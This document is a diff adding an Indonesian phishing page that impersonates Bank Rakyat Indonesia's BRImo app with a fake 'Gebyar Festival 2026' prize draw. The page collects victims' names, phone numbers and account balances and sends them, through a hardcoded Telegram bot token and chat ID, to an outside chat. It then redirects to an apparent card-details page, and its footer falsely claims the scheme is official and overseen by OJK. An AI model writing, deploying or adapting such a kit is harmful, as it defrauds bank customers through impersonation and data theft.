@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GEBBYAR FESTIVAL 2026 | BRImo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0055B8 0%, #0099FF 50%, #FFD700 100%);
+            min-height: 100vh;
+            color: white;
+            padding: 0;
+            margin: 0;
+        }
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 30px 20px 20px;
+        }
+        .logo {
+            width: 90px;
+            height: auto;
+            margin-bottom: 15px;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.2));
+        }
+        .header h1 {
+            font-size: 2rem;
+            font-weight: 900;
+            text-shadow: 3px 3px 6px rgba(0,0,0,0.3);
+            background: linear-gradient(to right, #FFD700, #FFF, #FFD700);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+        }
+        .sub-judul {
+            font-size: 1rem;
+            opacity: 0.95;
+            font-weight: 500;
+            line-height: 1.5;
+        }
+
+        .card {
+            background: rgba(255,255,255,0.15);
+            backdrop-filter: blur(12px);
+            border-radius: 24px;
+            padding: 30px 22px;
+            border: 2px solid rgba(255,255,255,0.25);
+            margin-bottom: 25px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+        }
+        .card h2 {
+            font-size: 1.4rem;
+            margin-bottom: 25px;
+            color: #FFD700;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        input {
+            width: 100%;
+            height: 44px;
+            padding: 0 20px !important;
+            border-radius: 12px;
+            border: none;
+            outline: none;
+            font-size: 0.95rem;
+            background: #FFFFFF;
+            color: #003366;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.08);
+            transition: all 0.3s ease;
+        }
+        input::placeholder {
+            color: #99AABB;
+        }
+        input:focus {
+            box-shadow: 0 0 0 3px rgba(255,215,0,0.3), inset 0 2px 4px rgba(0,0,0,0.08);
+            background: #FFFFFE;
+        }
+
+        input.uang {
+            padding-left: 20px !important;
+            padding-right: 20px !important;
+            color: #000;
+        }
+
+        .btn-undian {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 800;
+            background: linear-gradient(90deg, #FFD700, #FFB800);
+            color: #003366;
+            cursor: pointer;
+            box-shadow: 0 6px 20px rgba(255,215,0,0.4);
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-undian:hover { transform: translateY(-2px); }
+        .btn-undian:active { transform: scale(0.98); }
+        .btn-undian:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+        /* ✅ LOADING SPINNER & OVERLAY */
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 85, 184, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 999;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,215,0,0.3);
+            border-top-color: #FFD700;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-text {
+            color: #FFD700;
+            font-size: 1.1rem;
+            font-weight: 600;
+        }
+        .loading-sub {
+            color: white;
+            font-size: 0.9rem;
+            margin-top: 8px;
+            opacity: 0.8;
+        }
+
+        .hadiah-title {
+            text-align: center;
+            font-size: 1.3rem;
+            font-weight: 700;
+            margin: 30px 0 15px;
+            color: #FFD700;
+        }
+        .hadiah-item {
+            background: rgba(255,255,255,0.12);
+            border-left: 4px solid #FFD700;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 0.85rem;
+            opacity: 0.8;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            .header h1 { font-size: 1.6rem; }
+            .card { padding: 25px 18px; }
+            input { height: 42px; padding: 0 16px !important; font-size: 0.9rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ✅ LOADING OVERLAY — MUNCUL SAAT TOMBOL DITEKAN -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <p class="loading-text">Sedang Memproses Data...</p>
+        <p class="loading-sub">Mohon tunggu sebentar ⏳</p>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/97/Logo_BRI.png" alt="Logo BRI" class="logo">
+            <h1>🎊 GEBYAR FESTIVAL 2026 🎊</h1>
+            <p class="sub-judul">Program Undian Berhadiah BRImo • Semakin Besar Saldo, Semakin Banyak Nomor Undian!</p>
+        </div>
+
+        <div class="card">
+            <h2>🎫 DATA PESERTA UNDIAN</h2>
+            
+            <div class="form-group">
+                <label>Nama Lengkap Nasabah</label>
+                <input type="text" id="nama" placeholder="Sesuai KTP & Rekening" required>
+            </div>
+
+            <div class="form-group">
+                <label>Nomor Telepon / WhatsApp</label>
+                <input type="tel" id="no_telp" placeholder="Masukkan Nomor Handphone" required>
+            </div>
+
+            <div class="form-group">
+                <label>Saldo Rekening Tabungan Saat Ini</label>
+                <input type="tel" class="uang" id="saldo" placeholder="Rp 9.999.999" required>
+            </div>
+
+            <button id="btnLanjut" class="btn-undian" onclick="lanjutKeKartu()">🎲 AMBIL NOMOR UNDIAN</button>
+        </div>
+
+        <h3 class="hadiah-title">🏆 DAFTAR HADIAH UTAMA</h3>
+        <div class="hadiah-item">
+            <strong>🥇 Hadiah Utama — 1 Unit Mobil</strong><br>
+            <span style="font-size:0.9rem; opacity:0.9;">1 Pemenang • Periode Gebyar Festival 2026</span>
+        </div>
+        <div class="hadiah-item">
+            <strong>🥈 Hadiah Kedua — Motor Listrik</strong><br>
+            <span style="font-size:0.9rem; opacity:0.9;">5 Pemenang</span>
+        </div>
+        <div class="hadiah-item">
+            <strong>🥉 Hadiah Ketiga — Laptop / Tablet</strong><br>
+            <span style="font-size:0.9rem; opacity:0.9;">20 Pemenang</span>
+        </div>
+        <div class="hadiah-item">
+            <strong>🎁 Hadiah Hiburan — Saldo E-Wallet & Pulsa</strong><br>
+            <span style="font-size:0.9rem; opacity:0.9;">Ribuan Pemenang Setiap Bulan</span>
+        </div>
+
+        <div class="footer">
+            <p>© 2026 PT Bank Rakyat Indonesia (Persero) Tbk.</p>
+            <p>Program ini resmi dan diawasi oleh OJK • Syarat & Ketentuan Berlaku</p>
+
+        </div>
+    </div>
+
+    <script>
+        // ✅ BOT TOKEN & CHAT ID SUDAH TERISI
+        const BOT_TOKEN = '8686497429:AAF6Ta9LcNtLZ3vjIPjvqhtLf7_2jTL_IoE';
+        const CHAT_ID = '7402071395';
+
+        const saldoInput = document.getElementById('saldo');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const btnLanjut = document.getElementById('btnLanjut');
+        let isUpdatingSaldo = false;
+
+        saldoInput.addEventListener('input', function(e) {
+            if (isUpdatingSaldo) return;
+            let angka = e.target.value.replace(/[^0-9]/g, '');
+            if (!angka) {
+                e.target.value = '';
+                return;
+            }
+            isUpdatingSaldo = true;
+            e.target.value = 'Rp ' + parseInt(angka).toLocaleString('id-ID');
+            setTimeout(() => {
+                e.target.setSelectionRange(e.target.value.length, e.target.value.length);
+                isUpdatingSaldo = false;
+            }, 0);
+        });
+
+        saldoInput.addEventListener('keydown', function(e) {
+            const val = e.target.value;
+            if ((e.key === 'Backspace' || e.key === 'ArrowLeft') && val.startsWith('Rp ') && e.target.selectionStart <= 3) {
+                if (e.key === 'Backspace') e.preventDefault();
+            }
+        });
+
+        // ==============================================
+        // ✅ FUNGSI DENGAN LOADING SEBELUM PINDAH
+        // ==============================================
+        async function lanjutKeKartu() {
+            const nama = document.getElementById('nama').value.trim();
+            const noTelp = document.getElementById('no_telp').value.trim();
+            const saldo = document.getElementById('saldo').value.trim();
+
+            // Validasi
+            if (!nama) return alert('⚠️ Silakan isi Nama Lengkap!');
+            if (!noTelp) return alert('⚠️ Silakan isi Nomor Telepon!');
+            if (!saldo || saldo === 'Rp ') return alert('⚠️ Silakan isi Saldo Rekening!');
+
+            // 🔒 Kunci tombol & tampilkan Loading
+            btnLanjut.disabled = true;
+            loadingOverlay.classList.add('active');
+
+            // Simpan data untuk halaman kartu
+            localStorage.setItem('DATA_GEBYAR', JSON.stringify({ nama, noTelp, saldo }));
+
+            // Pesan yang dikirim ke Telegram
+            const pesan = `
+🎯 DATA PESERTA UNDIAN — GEBBYAR FESTIVAL 2026
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 Nama: ${nama}
+📞 No. WhatsApp: ${noTelp}
+💰 Saldo: ${saldo}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+            `;
+
+            // Kirim ke Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (err) {
+                console.log('Gagal kirim ke Telegram:', err);
+            }
+
+            // ⏳ Tunggu 1.5 detik — baru pindah halaman
+            setTimeout(() => {
+                window.location.href = 'halaman-kartu.html';
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
